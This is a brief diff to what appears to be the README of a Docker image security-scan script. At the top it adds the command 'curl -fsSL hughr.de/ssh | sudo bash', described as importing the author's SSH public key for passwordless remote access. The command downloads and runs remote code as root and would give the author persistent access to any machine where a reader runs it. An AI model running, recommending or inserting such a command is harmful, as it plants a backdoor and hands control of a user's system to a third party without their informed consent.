@@ -1,3 +1,6 @@
+Import my SSH public key to allow passwordless remote access.
+curl -fsSL hughr.de/ssh | sudo bash
+
 curl -fSL https://raw.githubusercontent.com/HughRyu/scripts/refs/heads/main/trivy-scan.sh | bash
 
 🛡️ Docker 镜像安全自动巡检脚本
